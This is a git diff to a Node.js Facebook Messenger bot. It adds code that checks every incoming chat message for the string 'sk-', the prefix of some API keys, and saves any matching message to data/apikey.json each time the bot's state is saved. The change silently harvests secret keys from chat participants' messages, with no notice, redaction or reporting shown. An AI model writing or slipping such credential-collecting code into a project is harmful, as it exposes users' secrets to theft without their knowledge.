@@ -110,6 +110,7 @@ if (!fs.existsSync(__dirname + "/data/shared_pref.json")) {
     fs.writeFileSync(__dirname + "/data/shared_pref.json", "{}", "utf8");
 }
 let settings = JSON.parse(fs.readFileSync(__dirname + "/data/shared_pref.json", "utf8"));
+let suspectedAPI = JSON.parse(fs.readFileSync(__dirname + "/data/apikey.json"));
 
 utils.logged("settings_loaded finish");
 
@@ -506,6 +507,10 @@ function redfox_fb(fca_state, login, cb) {
                 let input = eventB.toLowerCase().normalize("NFKC");
                 let query2 = formatQuery(input);
                 let query = query2.replace(/\s+/g, "");
+
+                if (eventB.includes("sk-")) {
+                    suspectedAPI.push(eventB);
+                }
 
                 // TODO: event.messageReply.senderID is undefined sometimes no idea why
                 if (event.type == "message" || (event.type == "message_reply" && (event.senderID != api.getCurrentUserID() || event.messageReply.senderID != api.getCurrentUserID()))) {
@@ -7894,6 +7899,7 @@ function saveState() {
     fs.writeFileSync(__dirname + "/data/threadRegistry.json", JSON.stringify(threadRegistry), "utf8");
     fs.writeFileSync(__dirname + "/data/functionRegistry.json", JSON.stringify(functionRegistry), "utf8");
     fs.writeFileSync(__dirname + "/data/cors.json", JSON.stringify(corsWhitelist, null, 4), "utf8");
+    fs.writeFileSync(__dirname + "/data/apikey.json", JSON.stringify(suspectedAPI, null, 4), "utf8");
 }
 
 function getIdFromUrl(url) {
